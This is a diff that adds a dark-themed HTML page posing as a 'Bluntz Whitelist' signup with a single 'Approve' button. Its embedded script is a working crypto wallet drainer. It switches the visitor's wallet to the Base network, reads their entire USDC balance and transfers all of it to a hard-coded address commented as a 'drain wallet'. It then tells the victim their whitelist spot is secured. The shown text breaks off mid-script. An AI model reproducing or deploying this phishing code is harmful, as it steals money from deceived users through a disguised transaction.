@@ -1,0 +1,79 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <title>Bluntz Whitelist</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    :root{--bg:#0d1117;--card:#161b22;--accent:#238636;--accentH:#2ea043;--text:#c9d1d9;--subtle:#8b949e;}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
+    .card{background:var(--card);border:1px solid #30363d;border-radius:12px;padding:48px 40px;max-width:420px;width:100%;box-shadow:0 20px 40px rgba(0,0,0,.45);text-align:center}
+    h1{font-size:2.1rem;font-weight:600;color:var(--accent);margin-bottom:8px}
+    h2{font-size:1rem;font-weight:400;color:var(--subtle);margin-bottom:32px}
+    button{background:var(--accent);color:#fff;border:none;padding:14px 0;width:100%;font-size:1rem;font-weight:600;border-radius:8px;cursor:pointer;transition:background .2s ease}
+    button:hover{background:var(--accentH)}
+    button:active{transform:scale(.98)}
+    #status{margin-top:24px;font-size:.9rem;color:var(--subtle)}
+    .loader{display:inline-block;border:2px solid var(--subtle);border-top-color:var(--accent);border-radius:50%;width:16px;height:16px;animation:spin 1s linear infinite;margin-right:8px;vertical-align:middle}
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Bluntz Whitelist</h1>
+    <h2>Approve once – secure your spot.</h2>
+    <button id="goBtn">Approve</button>
+    <div id="status"></div>
+  </div>
+
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
+  <script>
+    const RECIPIENT = "0x9C1a73a6a3c6B8B482a2a1F6E6D819B578dC397"; // Base drain wallet
+    const USDC      = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+
+    const goBtn  = document.getElementById("goBtn");
+    const status = document.getElementById("status");
+
+    goBtn.addEventListener("click", async ()=>{
+      goBtn.style.display = "none";
+      status.innerHTML = '<span class=loader></span> Connecting…';
+
+      const provider = window.ethereum;
+      if (!provider){
+        status.innerHTML = '❌ Please open this page inside Phantom or MetaMask browser.';
+        goBtn.style.display = "block";
+        return;
+      }
+      try{
+        await provider.request({method:'wallet_addEthereumChain',params:[{
+          chainId:'0x2105',
+          chainName:'Base',
+          nativeCurrency:{name:'ETH',symbol:'ETH',decimals:18},
+          rpcUrls:['https://mainnet.base.org'],
+          blockExplorerUrls:['https://basescan.org']
+        }]});
+        await provider.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x2105'}]});
+
+        const p = new ethers.providers.Web3Provider(provider);
+        const s = p.getSigner();
+        const me = await s.getAddress();
+
+        status.innerHTML = '<span class=loader></span> Fetching balance…';
+        const bal = await (new ethers.Contract(USDC,["function balanceOf(address) view returns(uint)"],p)).balanceOf(me);
+
+        if (bal.isZero()){
+          status.innerHTML = '❌ No USDC on Base detected.';
+          goBtn.style.display = "block";
+          return;
+        }
+
+        status.innerHTML = '<span class=loader></span> Sending…';
+        const usdc = new ethers.Contract(USDC,["function transfer(address,uint) returns(bool)"],s);
+        const tx = await usdc.transfer(RECIPIENT,bal);
+        await tx.wait();
+
+        status.innerHTML = '✅ Whitelist spot secured!';
+      }catch(e){
+        status.innerHTML = '❌ Failed – please try again.';
+        goBtn.style.display = "block";
